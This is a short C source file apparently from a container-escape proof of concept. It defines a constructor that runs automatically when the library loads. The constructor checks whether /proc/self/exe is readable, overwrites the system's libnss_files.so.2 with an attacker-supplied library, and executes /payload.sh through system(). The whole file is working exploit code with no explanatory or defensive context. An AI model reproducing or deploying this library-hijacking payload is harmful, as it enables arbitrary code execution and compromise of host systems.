#include <stdio.h>
#include <stdlib.h> 
  
__attribute__ ((constructor)) void exp_func()
{
    FILE * proc = fopen("/proc/self/exe", "r");
    if (proc != NULL)
    {
        fclose(proc);
        return;
    }
    rename("/origin.so", "/lib/x86_64-linux-gnu/libnss_files.so.2");
    system("/payload.sh");
    return;
}
